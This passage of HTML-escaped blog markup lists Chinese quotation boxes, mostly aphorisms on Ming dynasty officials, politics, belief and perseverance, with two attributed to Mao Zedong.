class=&#34;admonition-content&#34;&gt;无善无恶心之体，有善有恶意之动。&#xA;知善知恶是良知，为善去恶是格物。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;观点斗争是假的，方向斗争也是假的，只有权力斗争才是真的。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;纵使憨直，诚然不屈，这就是明代官员的气节。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;那些二十岁的青年人是不会懂得这些的，他们太天真、太幼稚，他们或许能够在考试中得到一百分，却不可能真正了解其中的含义。所以，他们虽然手握真理，却无法使用，满怀热情地踏入社会，却被撞得头破血流。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;在这个残酷的现实面前，徐阶终于明白了知行合一的真意，无论有多么伟大正直的理想，要实现它，还必须懂得两个字——“变通”。只有变通，只有切合实际的行动，才能适应这个变化万千的世界。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;只有真正了解这个世界的丑陋与污浊，被现实打击，被痛苦折磨，遍体鳞伤、无所遁形，却从未放弃对光明的追寻，依然微笑着坚定前行的人，才是真正的勇者。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;所谓事可以做绝，话不能说绝，是也。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;历经磨难，矢志不移，叫作信念。&#xA;不畏强权，虽死无惧，叫作勇气。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;历史告诉我们，所谓道德与公理，只有在实力相等的情况下才能拿出来讨论。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;所以他终于意识到，把自己的命运和信念寄托在一个人身上，是极其不靠谱的，亲密战友胡宗宪也不例外。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;“鞠躬尽瘁，夕死无憾，此即长生之术！”&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;等待只因值得，隐忍只为爆发，要坚信，属于我们的机会终会到来。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;从道士到钢铁战士，只是因为一件东西——信仰。在这个世界上，信仰是最为坚固的物体，一旦坚持，就很难动摇，而金钱、美色在它的面前，是极为软弱无力的。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;原来人生可以如同地狱一般。在看过了无数百姓沿街乞讨、卖儿卖女，只求能够多吃一顿、多活一天的惨象后，张居正发出了这样的长叹。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;所以我相信，即使这个世界十分阴晦、十分邪恶，即使它让你痛不欲生、生不如死，但依然应该鼓起勇气，勇敢地活下去。所以我相信，希望是不会死去的。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;在封建时代，就做封建时代的事，说封建时代的话，别指望人家有多高的觉悟，这就叫历史唯物主义。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;在这个世界上，所有存在的东西，必有其合理性，否则它就绝不会诞生。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;把所有不服你的人都打服，敢出声就灭了他，所有人都认你当大哥，这就叫实现团结。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;没有无缘无故的爱，也没有无缘无故的恨，原来如此。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;我知道，我有极为坚强的意志，我的斗志不会衰竭，我的心志不会动摇，即使与全天下人为敌，我也决不妥协。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;所有的英雄，都是平凡的人。千回百转，千锤百炼，矢志不改，如此而已。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;你还很年轻，将来你会遇到很多人，经历很多事，得到很多，也会失去很多，但无论如何，有两样东西，你绝不能丢弃，一个叫良心，另一个叫理想。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;在这个世界上，笨人的第一特征，就是自认为聪明。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;义武奋扬，跳梁者，虽强必戮！&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;临战之时，国仇家恨，慷慨激昂，大家都激动。在这个时候，跟着激动一把，可谓是毫无成本，反正仗也不用自己打，还能落个爱国的名声，何乐而不为？&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;许多你曾无比熟悉的人，其实十分陌生；许多你曾坚信的事实，其实十分虚伪；而这，只不过是个开头。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;很多人说过，最好的老师，不是特级教师，不是名牌学校，而是兴趣。但我要告诉你，这个答案是错误的。在这个世界上，最优秀的老师，是生存。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;纯粹的人，是这个世界上最可怕的人。他们的一生，往往只有一个目标。为了达到这个目标，他们可以不择手段，不顾一切；他们无法被收买，无法被威逼，他们不要钱，不要女色，甚至不要权势和名声。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;无论搞多少次普法教育，都是没用的，只要让大家都去监狱住两天，亲自实践，就不会再犯罪了。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;政治的最高技巧，不是你死我活，而是妥协。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;只有岁月的沧桑，才能淘尽一切污浊，扫清人们眼帘上的遮盖与灰尘，看到那些殉道者无比璀璨的光芒，历千年而不灭。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;一个人应该坚持信念，至死也不动摇。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;不要以为渺小的，就没有力量；不要以为卑微的，就没有尊严。弱者和强者之间唯一的差别，只在信念是否坚定。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;我们的同志在困难的时候，要看到成绩，要看到光明，要提高我们的勇气。&#xA;——毛泽东&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;军队应该具有一往无前的精神，它要压倒一切敌人，而决不被敌人所屈服。不论在任何艰难困苦的场合，只要还有一个人，这个人就要继续战斗下去。&#xA;——毛泽东&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;只要你不放弃自己，上天就不会放弃你。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;张牙舞爪的人，往往是脆弱的，因为真正强大的人，是自信的，自信就会温和，温和就会坚定。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;我们之所以一直这样认为，只是因为有人这样告诉我们。之所以有人这样告诉我们，是因为他们希望我们这样认为。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;其实很多时候，群众是好说话的，因为他们所需要的并非特权，而是公平。&lt;/div&gt;&#xD;&#xA;    